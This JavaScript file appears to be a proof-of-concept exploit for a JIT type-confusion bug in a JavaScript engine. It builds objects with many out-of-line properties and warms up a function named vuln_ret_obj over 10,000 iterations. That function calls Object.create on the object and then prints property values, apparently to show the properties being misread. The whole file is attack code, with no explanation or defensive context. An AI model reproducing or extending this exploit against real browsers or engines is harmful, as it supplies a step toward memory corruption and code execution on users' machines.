compareArray = [
  0x4444,
  0x4545,
  0x4646,
  0x4747,
  0x4848,
  0x4949,
  0x4a4a,
  0x4b4b,
  0x4c4c,
  0x4d4d,
  0x4e4e,
  0x4f4f,
  0x5050,
  0x5151,
  0x5252,
  0x5353,
  0x5454,
  0x5555,
  0x5656,
  0x5757,
  0x5858,
  0x5959,
  0x5a5a,
  0x5b5b,
  0x5c5c,
  0x5d5d,
  0x5e5e,
  0x5f5f,
  0x6060,
  0x6161,
  0x6262,
  0x6363,
]

function hex(value) {
  if (value === undefined) return "undefined"
  return "0x" + value.toString(16)
}

function vuln_ret_obj(obj, disable_log=true) {  
  obj.a;  
  Object.create(obj); 
  let ret1 = obj.c
  let ret2 = obj.d
  let ret3 = obj.e
  let ret4 = obj.f
  let ret5 = obj.g
  let ret6 = obj.h
  let ret7 = obj.i
  let ret8 = obj.j
  let ret9 = obj.k
  let ret10 = obj.l
  let ret11 = obj.m
  let ret12 = obj.n
  let ret13 = obj.o
  let ret14 = obj.p
  let ret15 = obj.q
  let ret16 = obj.r
  if (!disable_log) {
    print(hex(ret1))
    print(hex(ret2))
    print(hex(ret3))
    print(hex(ret4))
    print(hex(ret5))
    print(hex(ret6))
    print(hex(ret7))
    print(hex(ret8))
    print(hex(ret9))
    print(hex(ret10))
    print(hex(ret11))
    print(hex(ret12))
    print(hex(ret13))
    print(hex(ret14))
    print(hex(ret15))
    print(hex(ret16))
  }
  return 0
}


function create_obj() {
  let obj1 = {a:0x4242,b:0x4343}; // Create object with in-line properties
  obj1.c = compareArray[0]; // Store property out-of-line in backing store
  obj1.d = compareArray[1]; // Store property out-of-line in backing store
  obj1.e = compareArray[2]; // Store property out-of-line in backing store
  obj1.f = compareArray[3]; // Store property out-of-line in backing store
  obj1.g = compareArray[4]; // Store property out-of-line in backing store
  obj1.h = compareArray[5]; // Store property out-of-line in backing store
  obj1.i = compareArray[6]; // Store property out-of-line in backing store
  obj1.j = compareArray[7]; // Store property out-of-line in backing store
  obj1.k = compareArray[8]; // Store property out-of-line in backing store
  obj1.l = compareArray[9]; // Store property out-of-line in backing store
  obj1.m = compareArray[10]; // Store property out-of-line in backing store
  obj1.n = compareArray[11]; // Store property out-of-line in backing store
  obj1.o = compareArray[12]; // Store property out-of-line in backing store
  obj1.p = compareArray[13]; // Store property out-of-line in backing store
  obj1.q = compareArray[14]; // Store property out-of-line in backing store
  obj1.r = compareArray[15]; // Store property out-of-line in backing store
  obj1.s = compareArray[16]; // Store property out-of-line in backing store
  obj1.t = compareArray[17]; // Store property out-of-line in backing store
  obj1.u = compareArray[18]; // Store property out-of-line in backing store
  obj1.v = compareArray[19]; // Store property out-of-line in backing store
  obj1.w = compareArray[20]; // Store property out-of-line in backing store
  obj1.x = compareArray[21]; // Store property out-of-line in backing store
  obj1.y = compareArray[22]; // Store property out-of-line in backing store
  obj1.z = compareArray[23]; // Store property out-of-line in backing store
  obj1.aa = compareArray[24]; // Store property out-of-line in backing store
  obj1.ab = compareArray[25]; // Store property out-of-line in backing store
  obj1.ac = compareArray[26]; // Store property out-of-line in backing store
  return obj1
}

for (let i = 0; i < 10000 ; i++) {
  let the_obj_1 = create_obj();
  vuln_ret_obj(the_obj_1);
}

let the_obj_2 = create_obj();
vuln_ret_obj(the_obj_2, false)



